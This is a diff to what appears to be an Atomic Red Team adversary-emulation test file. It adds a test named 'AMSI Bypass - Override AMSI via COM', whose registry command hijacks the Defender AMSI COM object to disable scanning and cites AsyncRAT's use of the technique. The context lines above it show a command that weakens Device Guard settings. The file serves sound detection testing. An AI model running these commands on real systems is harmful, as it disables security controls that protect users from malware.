@@ -875,3 +875,18 @@ atomic_tests:
       reg delete "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Locked" /f
     name: powershell
     elevation_required: true
+- name: AMSI Bypass - Override AMSI via COM
+  description: |
+    With administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.
+    This is currently being used by AsyncRAT and others. 
+    https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html
+    https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
+    cleanup_command: |
+      REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
+    name: command_prompt
+    elevation_required: true
